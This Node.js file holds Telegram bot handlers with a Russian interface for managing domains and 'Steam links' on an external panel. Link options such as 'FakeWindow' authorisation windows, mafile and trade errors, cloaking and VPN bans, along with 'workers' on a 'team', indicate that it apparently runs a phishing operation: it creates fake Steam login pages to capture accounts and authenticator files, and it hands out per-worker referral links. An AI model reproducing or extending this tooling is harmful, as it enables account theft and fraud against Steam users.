const { ensureUser, isTeamReferralPathTaken, getTeamReferralForDomain, upsertTeamReferral } = require("../services/userService");
const {
  authCredentials,
  getDomains,
  checkDomainAvailability,
  getActualIPs,
  createDomain,
  getSteamLinks,
  getTemplates,
  createSteamLink,
  updateSteamLink,
  normalizeWindowType,
  getTeamWorkers,
  formatPanelError,
  isTimeoutError,
} = require("../services/apiService");
const { ensureWorkerPanelAccount } = require("../services/panelAccountService");
const { env } = require("../config/env");
const {
  generateReferralCode,
  formatReferralLinkHtml,
  formatSitesHubHtml,
  formatDomainCardHtml,
  formatLinkParamsHtml,
  getLinkParamDefs,
  escapeHtml,
} = require("../utils/referral");
const { upsertBotMessage } = require("../utils/message");
const { pe, btn } = require("../utils/emoji");
const { clearPendingInputs, isBotCommandText } = require("../utils/session");
const {
  sitesKeyboard,
  sitesBindConfirmKeyboard,
  domainLinksKeyboard,
  linkCreatorKeyboard,
  linkWindowTypeKeyboard,
  templatesKeyboard,
  referralLinkKeyboard,
  referralParamsKeyboard,
  referralWindowKeyboard,
  referralTemplatesKeyboard,
} = require("../keyboards/sites");

function filterAvailableDomains(rows = [], accountId) {
  return Array.isArray(rows)
    ? rows.filter((domain) => domain?.isTeamPublic === true || Number(domain?.owner) === Number(accountId))
    : [];
}

function filterOwnDomainsOnly(rows = [], accountId) {
  return Array.isArray(rows)
    ? rows.filter((domain) => Number(domain?.owner) === Number(accountId))
    : [];
}

function extractPanelOwnerId(data) {
  const value = [
    data?.id,
    data?.user?.id,
    data?.account?.id,
    data?.data?.id,
    data?.data?.user?.id,
  ].find((id) => Number.isFinite(Number(id)));
  return value == null ? null : Number(value);
}

function extractOwnerIdFromToken(token) {
  try {
    const payload = JSON.parse(Buffer.from(String(token).split(".")[1], "base64url").toString("utf8"));
    const id = Number(payload?.id);
    return Number.isFinite(id) ? id : null;
  } catch (_) {
    return null;
  }
}

function isInvalidCredentialsError(error) {
  const status = error?.response?.status;
  const code = String(error?.response?.data?.code || "");
  const message = String(error?.response?.data?.message || error?.message || "");
  return (
    status === 400 ||
    status === 401 ||
    /invalid_credentials|неверный логин|неверный пароль/i.test(`${code} ${message}`)
  );
}

function pickActualIp(ips) {
  if (Array.isArray(ips)) return ips[0] || "—";
  if (typeof ips === "string") return ips;
  return ips?.ip || ips?.[0] || "—";
}

async function showIpBindStep(ctx, flow, auth) {
  const ip = pickActualIp(await getActualIPs(auth.token));
  flow.step = "bind_confirm";
  flow.bindType = "IP";
  flow.bindIp = ip;
  flow.isPublic = false;
  flow.isTransit = false;
  await upsertBotMessage(
    ctx,
    [
      `${pe("location")} <b>Привязка по IP</b>`,
      "",
      `Домен: <code>${escapeHtml(flow.domain)}</code>`,
      `IP: <code>${escapeHtml(ip)}</code>`,
      "",
      `${pe("info")} Укажите A-запись домена на этот IP у регистратора.`,
      "Когда DNS готов — нажмите «Добавить домен».",
    ].join("\n"),
    { reply_markup: sitesBindConfirmKeyboard().reply_markup }
  );
}

/**
 * Авторизация в панели. НИКОГДА не пересоздаёт аккаунт при timeout/сбое сети —
 * только сообщает об ошибке. Иначе у админов плодятся лишние учётки.
 */
async function getPanelToken(user) {
  const ready = await ensureWorkerPanelAccount(user);
  if (!ready.panelUsername || !ready.panelPassword) {
    throw new Error("Нет аккаунта сайтов. Создайте или привяжите его в админке.");
  }

  let auth;
  try {
    auth = await authCredentials(ready.panelUsername, ready.panelPassword);
  } catch (error) {
    if (isTimeoutError(error)) throw new Error(formatPanelError(error));
    if (isInvalidCredentialsError(error)) {
      throw new Error(
        "Неверный логин или пароль панели. Перепривяжите аккаунт сайтов в карточке участника."
      );
    }
    throw new Error(formatPanelError(error));
  }

  if (!auth.token) {
    throw new Error("Не удалось подключить сайты. Попробуйте позже.");
  }

  let ownerId = extractOwnerIdFromToken(auth.token);
  if (!Number.isFinite(ownerId)) {
    try {
      const workers = await getTeamWorkers(auth.token);
      ownerId = Number(
        workers?.rows?.find(
          (row) => String(row.username).toLowerCase() === String(ready.panelUsername).toLowerCase()
        )?.id
      );
    } catch (_) { /* fallback below */ }
  }
  ownerId = Number.isFinite(ownerId) ? ownerId : extractPanelOwnerId(auth.data);
  if (!Number.isFinite(ownerId)) {
    throw new Error("Не удалось определить ID аккаунта панели.");
  }
  return { token: auth.token, ownerId };
}

function linkPayload(domain, state) {
  return {
    path: state.path || "",
    windowType: state.windowType || "FakeWindow",
    domain,
    template: state.templateId,
    cloaking: false,
    ban_vpn: false,
    iframe: true,
    logError: true,
    mafileError: false,
    mafileSteamRedirect: true,
    tradeError: true,
    randPath: !state.path,
  };
}

const STEAM_PARAM_KEYS = new Set(["logError", "tradeError", "mafileError", "mafileSteamRedirect"]);
const PANEL_AUTH_TTL_MS = 10 * 60 * 1000;

async function loadDomainById(token, ownerId, domainId) {
  const domains = filterAvailableDomains((await getDomains(token, 0, 50)).rows, ownerId);
  const domain = domains.find((row) => Number(row.id) === Number(domainId));
  if (!domain) throw new Error("Домен недоступен.");
  return domain;
}

function getReferralCache(ctx, domainId) {
  const cache = ctx.session?.referralCache;
  if (!cache || Number(cache.domainId) !== Number(domainId)) return null;
  return cache;
}

function setReferralCache(ctx, payload) {
  if (!ctx.session) return payload;
  ctx.session.referralCache = {
    domainId: Number(payload.domainId),
    existing: payload.existing,
    domain: payload.domain,
    row: payload.row,
    ownDomain: Boolean(payload.ownDomain),
  };
  return ctx.session.referralCache;
}

function clearReferralCache(ctx) {
  if (ctx.session) ctx.session.referralCache = null;
}

function rememberPanelAuth(ctx, auth) {
  if (!ctx.session || !auth?.token) return auth;
  ctx.session.panelAuth = { token: auth.token, ownerId: auth.ownerId, at: Date.now() };
  return auth;
}

async function resolvePanelAuth(ctx, user) {
  const cached = ctx.session?.panelAuth;
  if (cached?.token && Date.now() - Number(cached.at || 0) < PANEL_AUTH_TTL_MS) {
    return { token: cached.token, ownerId: cached.ownerId };
  }
  return rememberPanelAuth(ctx, await getPanelToken(user));
}

function applyLinkPatchToRow(row, patch = {}) {
  const next = { ...(row || {}) };
  const steamPatch = {};
  for (const [key, value] of Object.entries(patch)) {
    if (STEAM_PARAM_KEYS.has(key)) steamPatch[key] = value;
    else next[key] = value;
  }
  if (Object.keys(steamPatch).length) {
    next.steam = { ...(next.steam || {}), ...steamPatch };
  }
  return next;
}

/** Панель требует windowType в любом PATCH ссылки. */
function linkUpdatePayload(cache, patch = {}) {
  return {
    ...patch,
    windowType: normalizeWindowType(patch.windowType ?? cache?.row?.windowType),
  };
}

async function loadReferralRow(auth, user, domainId) {
  const existing = await getTeamReferralForDomain(user.telegramId, domainId);
  if (!existing) throw new Error("Реферальная ссылка ещё не создана.");
  const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
  const links = (await getSteamLinks(auth.token, domainId, 0, 50)).rows || [];
  const row =
    links.find(
      (link) =>
        Number(link.id) === Number(existing.panelLinkId) ||
        String(link.path) === String(existing.path)
    ) || existing;
  return {
    domainId: Number(domainId),
    existing,
    domain,
    row,
    ownDomain: Number(domain.owner) === auth.ownerId,
  };
}

async function getReferralView(ctx, user, domainId, auth, { force = false } = {}) {
  if (!force) {
    const cached = getReferralCache(ctx, domainId);
    if (cached) return cached;
  }
  const loaded = await loadReferralRow(auth, user, domainId);
  return setReferralCache(ctx, loaded);
}

async function renderReferralCard(ctx, cache) {
  await upsertBotMessage(
    ctx,
    formatReferralLinkHtml(cache.domain.domain, cache.existing.path, cache.row, cache.domain, {
      ownDomain: cache.ownDomain,
    }),
    { reply_markup: referralLinkKeyboard(cache.domainId).reply_markup }
  );
}

async function renderReferralParams(ctx, cache) {
  await upsertBotMessage(ctx, formatLinkParamsHtml(cache.row), {
    reply_markup: referralParamsKeyboard(cache.domainId, cache.row).reply_markup,
  });
}

async function showReferral(ctx, user, domainId, auth, { force = false } = {}) {
  const cache = await getReferralView(ctx, user, domainId, auth, { force });
  await renderReferralCard(ctx, cache);
  return cache;
}

async function showReferralParams(ctx, user, domainId, auth, { force = false } = {}) {
  const cache = await getReferralView(ctx, user, domainId, auth, { force });
  await renderReferralParams(ctx, cache);
  return cache;
}

async function showSitesHub(ctx, user) {
  const auth = rememberPanelAuth(ctx, await getPanelToken(user));
  clearReferralCache(ctx);
  const domains = filterAvailableDomains((await getDomains(auth.token, 0, 50)).rows, auth.ownerId);
  ctx.session.sites = { domains, ownerId: auth.ownerId };
  await upsertBotMessage(ctx, formatSitesHubHtml(domains, auth.ownerId), {
    reply_markup: sitesKeyboard(domains, auth.ownerId).reply_markup,
  });
  return auth;
}

function registerSitesHandlers(bot) {
  bot.action("menu:sites", async (ctx) => {
    clearPendingInputs(ctx);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      await showSitesHub(ctx, user);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: { inline_keyboard: [[btn("Назад", "menu:home", "home")]] },
      });
    }
  });

  bot.action(/^sites:domain:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    if (ctx.session) {
      ctx.session.linkCreate = null;
      ctx.session.linkCreateStep = null;
      ctx.session.linkTemplates = null;
      ctx.session.sitesFlow = null;
      clearReferralCache(ctx);
    }
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
      const own = Number(domain.owner) === auth.ownerId;
      // Как в панели: на командном домене видны только свои ссылки.
      const links = ((await getSteamLinks(auth.token, domainId, 0, 50)).rows || []).filter(
        (link) => Number(link.owner) === auth.ownerId
      );
      ctx.session.sites = {
        ...(ctx.session.sites || {}),
        activeDomainId: domainId,
        activeDomainName: domain.domain,
        ownerId: auth.ownerId,
      };
      await upsertBotMessage(ctx, formatDomainCardHtml(domain, { own, linksCount: links.length }), {
        reply_markup: domainLinksKeyboard(domainId, links, { team: !own }).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:add", async (ctx) => {
    clearPendingInputs(ctx);
    ctx.session.sitesFlow = { step: "domain_input" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        `${pe("edit")} <b>Добавление домена</b>`,
        "",
        "Введите домен, например <code>example.com</code>.",
        "",
        `${pe("info")} Дальше покажем IP для A-записи и подтверждение.`,
      ].join("\n"),
      {
        reply_markup: {
          inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]],
        },
      }
    );
  });

  bot.action("sites:cancel", async (ctx) => {
    await ctx.answerCbQuery("Операция отменена");
    clearPendingInputs(ctx);
    try {
      const user = await ensureUser(ctx.from);
      await showSitesHub(ctx, user);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: { inline_keyboard: [[btn("В меню", "menu:home", "home")]] },
      });
    }
  });

  bot.action("sites:bind:confirm:IP", async (ctx) => {
    const flow = ctx.session?.sitesFlow;
    if (!flow?.domain) return ctx.answerCbQuery("Сессия истекла", { show_alert: true });
    await ctx.answerCbQuery("Добавляю домен…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      const created = await createDomain(auth.token, {
        domain: flow.domain,
        type: "IP",
        service: "Steam",
        isPublic: false,
        isTransit: false,
      });
      const domainId = created?.id || created?.data?.id;
      ctx.session.sitesFlow = null;
      await upsertBotMessage(
        ctx,
        [
          `${pe("success")} <b>Домен добавлен</b>`,
          "",
          `Домен: <code>${escapeHtml(created?.domain || flow.domain)}</code>`,
          domainId != null ? `ID: <code>${domainId}</code>` : null,
          created?.ip ? `IP: <code>${escapeHtml(created.ip)}</code>` : null,
          "",
          `${pe("info")} Дождитесь обновления DNS, затем создайте ссылки.`,
        ]
          .filter((line) => line != null)
          .join("\n"),
        {
          reply_markup: {
            inline_keyboard: [
              domainId
                ? [btn("Открыть домен", `sites:domain:${domainId}`, "link")]
                : [btn("К сайтам", "menu:sites", "home")],
              [btn("К сайтам", "menu:sites", "home")],
            ],
          },
        }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`, {
        reply_markup: sitesBindConfirmKeyboard().reply_markup,
      });
    }
  });

  bot.action(/^sites:link_create:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      // Личный или командный публичный — как «Создать ссылку» в панели.
      await loadDomainById(auth.token, auth.ownerId, domainId);
      ctx.session.linkCreate = {
        domainId,
        domainName: ctx.session?.sites?.activeDomainName || "",
        path: "",
        windowType: "FakeWindow",
        templateId: null,
        templateName: "",
      };
      await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
        reply_markup: linkCreatorKeyboard(domainId, ctx.session.linkCreate).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:link:path", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    ctx.session.linkCreateStep = "path_input";
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("edit")} Введите path или <code>-</code>, чтобы оставить пустым.`, {
      reply_markup: { inline_keyboard: [[btn("Отменить", "sites:cancel", "error")]] },
    });
  });

  bot.action("sites:link:template", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    await ctx.answerCbQuery();
    try {
      const auth = await getPanelToken(await ensureUser(ctx.from));
      ctx.session.linkTemplates = (await getTemplates(auth.token, 0, 50)).rows || [];
      await upsertBotMessage(ctx, `${pe("file")} Выберите шаблон.`, {
        reply_markup: templatesKeyboard(ctx.session.linkTemplates).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:template:(\d+)$/, async (ctx) => {
    const template = ctx.session?.linkTemplates?.find((row) => Number(row.id) === Number(ctx.match[1]));
    if (!ctx.session?.linkCreate || !template) return ctx.answerCbQuery("Шаблон не найден", { show_alert: true });
    Object.assign(ctx.session.linkCreate, { templateId: template.id, templateName: template.name });
    await ctx.answerCbQuery("Шаблон выбран");
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action("sites:link:window", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} Выберите окно авторизации.`, {
      reply_markup: linkWindowTypeKeyboard().reply_markup,
    });
  });

  bot.action(/^sites:window:(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Начните создание ссылки", { show_alert: true });
    ctx.session.linkCreate.windowType = ctx.match[1];
    await ctx.answerCbQuery("Окно обновлено");
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action("sites:link:editor", async (ctx) => {
    if (!ctx.session?.linkCreate) return ctx.answerCbQuery("Сессия завершена", { show_alert: true });
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
      reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
    });
  });

  bot.action(/^sites:link:create:(\d+)$/, async (ctx) => {
    const state = ctx.session?.linkCreate;
    if (!state || state.domainId !== Number(ctx.match[1]) || !state.templateId) {
      return ctx.answerCbQuery("Выберите шаблон и начните заново", { show_alert: true });
    }
    await ctx.answerCbQuery();
    try {
      const auth = await getPanelToken(await ensureUser(ctx.from));
      const created = await createSteamLink(auth.token, linkPayload(state.domainId, state));
      ctx.session.linkCreate = null;
      await upsertBotMessage(
        ctx,
        `${pe("success")} <b>Ссылка создана</b>\n\n<code>/${created?.path || state.path || "random"}</code>`,
        { reply_markup: { inline_keyboard: [[btn("К домену", `sites:domain:${state.domainId}`, "home")]] } }
      );
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action("sites:links:noop", (ctx) => ctx.answerCbQuery("Это существующая ссылка"));

  bot.action(/^sites:ref:refresh:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery("Обновляю…");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      await showReferral(ctx, user, domainId, auth, { force: true });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:params:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const cache = getReferralCache(ctx, domainId);
      if (cache) {
        await renderReferralParams(ctx, cache);
        return;
      }
      const user = await ensureUser(ctx.from);
      await showReferralParams(ctx, user, domainId, await resolvePanelAuth(ctx, user));
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:param:(\d+):([a-zA-Z_]+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const key = ctx.match[2];
    await ctx.answerCbQuery();
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      const def = getLinkParamDefs(cache.row).find((param) => param.key === key);
      if (!def) throw new Error("Неизвестный параметр.");
      const patch = def.patch(!def.value);
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, patch));
      cache.row = applyLinkPatchToRow(cache.row, patch);
      setReferralCache(ctx, cache);
      await renderReferralParams(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    const user = await ensureUser(ctx.from);
    try {
      const cached = getReferralCache(ctx, domainId);
      if (cached) {
        await renderReferralCard(ctx, cached);
        return;
      }

      const auth = await resolvePanelAuth(ctx, user);
      const existing = await getTeamReferralForDomain(user.telegramId, domainId);
      if (existing) {
        await showReferral(ctx, user, domainId, auth, { force: true });
        return;
      }
      if (!Number.isFinite(env.referralTemplateId) || env.referralTemplateId <= 0) {
        throw new Error("Не задан REFERRAL_TEMPLATE_ID.");
      }
      for (let attempt = 0; attempt < 25; attempt += 1) {
        const path = generateReferralCode();
        if (await isTeamReferralPathTaken(domainId, path)) continue;
        try {
          const created = await createSteamLink(auth.token, {
            ...linkPayload(domainId, { path, windowType: "FakeWindow", templateId: env.referralTemplateId }),
            randPath: false,
          });
          const saved = {
            domainId,
            path: String(created?.path || path).replace(/^\/+/, ""),
            panelLinkId: created?.id,
          };
          await upsertTeamReferral(user.telegramId, saved);
          const domain = await loadDomainById(auth.token, auth.ownerId, domainId);
          setReferralCache(ctx, {
            domainId,
            existing: saved,
            domain,
            row: created || saved,
            ownDomain: Number(domain.owner) === auth.ownerId,
          });
          await renderReferralCard(ctx, getReferralCache(ctx, domainId));
          return;
        } catch (error) {
          if (!/exist|taken|duplicate|unique|conflict/i.test(String(error?.response?.data?.message || error.message))) {
            throw error;
          }
        }
      }
      throw new Error("Не удалось создать уникальную реферальную ссылку.");
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:back:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const cache = getReferralCache(ctx, domainId);
      if (cache) {
        await renderReferralCard(ctx, cache);
        return;
      }
      const user = await ensureUser(ctx.from);
      await showReferral(ctx, user, domainId, await resolvePanelAuth(ctx, user));
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:template:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    await ctx.answerCbQuery();
    try {
      const cachedTemplates = ctx.session?.linkTemplates;
      if (Array.isArray(cachedTemplates) && cachedTemplates.length) {
        await upsertBotMessage(ctx, `${pe("file")} <b>Шаблоны</b>\n\nВыберите шаблон для реферальной ссылки.`, {
          reply_markup: referralTemplatesKeyboard(domainId, cachedTemplates).reply_markup,
        });
        return;
      }
      const auth = await resolvePanelAuth(ctx, await ensureUser(ctx.from));
      const templates = (await getTemplates(auth.token, 0, 30)).rows || [];
      if (ctx.session) ctx.session.linkTemplates = templates;
      await upsertBotMessage(ctx, `${pe("file")} <b>Шаблоны</b>\n\nВыберите шаблон для реферальной ссылки.`, {
        reply_markup: referralTemplatesKeyboard(domainId, templates).reply_markup,
      });
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:template:set:(\d+):(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const templateId = Number(ctx.match[2]);
    await ctx.answerCbQuery("Шаблон обновлён");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, { template: templateId }));
      const templateMeta =
        (ctx.session?.linkTemplates || []).find((row) => Number(row.id) === templateId) ||
        cache.row?.template ||
        {};
      cache.row = {
        ...cache.row,
        template: {
          id: templateId,
          name: templateMeta.name || cache.row?.template?.name || String(templateId),
        },
      };
      setReferralCache(ctx, cache);
      await renderReferralCard(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.action(/^sites:ref:window:(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, `${pe("settings")} Выберите окно авторизации.`, {
      reply_markup: referralWindowKeyboard(Number(ctx.match[1])).reply_markup,
    });
  });

  bot.action(/^sites:ref:win:(\d+):(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const windowType = ctx.match[2];
    await ctx.answerCbQuery("Окно обновлено");
    try {
      const user = await ensureUser(ctx.from);
      const auth = await resolvePanelAuth(ctx, user);
      let cache = getReferralCache(ctx, domainId);
      if (!cache) cache = await getReferralView(ctx, user, domainId, auth);
      const linkId = cache.existing?.panelLinkId || cache.row?.id;
      if (!linkId) throw new Error("Ссылка не найдена.");
      await updateSteamLink(auth.token, domainId, linkId, linkUpdatePayload(cache, { windowType }));
      cache.row = { ...cache.row, windowType };
      setReferralCache(ctx, cache);
      await renderReferralCard(ctx, cache);
    } catch (error) {
      await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
    }
  });

  bot.on("text", async (ctx, next) => {
    if (ctx.scene?.current) return next();
    const raw = String(ctx.message.text || "").trim();
    if (isBotCommandText(raw)) {
      clearPendingInputs(ctx);
      return next();
    }
    if (ctx.session?.sitesFlow?.step === "domain_input") {
      const domain = raw
        .toLowerCase()
        .replace(/^https?:\/\//, "")
        .replace(/^www\./, "")
        .replace(/\/+$/, "");
      if (!domain || !domain.includes(".")) {
        await upsertBotMessage(ctx, `${pe("error")} Введите корректный домен.`);
        return;
      }
      try {
        const auth = await resolvePanelAuth(ctx, await ensureUser(ctx.from));
        const check = await checkDomainAvailability(auth.token, domain);
        if (!check.available) {
          throw new Error(check.message || "Домен недоступен.");
        }
        ctx.session.sitesFlow = {
          step: "bind_confirm",
          domain,
          isPublic: false,
          isTransit: false,
        };
        await showIpBindStep(ctx, ctx.session.sitesFlow, auth);
      } catch (error) {
        await upsertBotMessage(ctx, `${pe("error")} ${formatPanelError(error)}`);
      }
      return;
    }
    if (ctx.session?.linkCreateStep === "path_input" && ctx.session?.linkCreate) {
      ctx.session.linkCreate.path = raw === "-" ? "" : raw.replace(/[\s/]+/g, "");
      ctx.session.linkCreateStep = null;
      await upsertBotMessage(ctx, `${pe("settings")} <b>Создание ссылки</b>`, {
        reply_markup: linkCreatorKeyboard(ctx.session.linkCreate.domainId, ctx.session.linkCreate).reply_markup,
      });
      return;
    }
    return next();
  });
}

module.exports = { registerSitesHandlers, filterAvailableDomains, filterOwnDomainsOnly, getPanelToken };
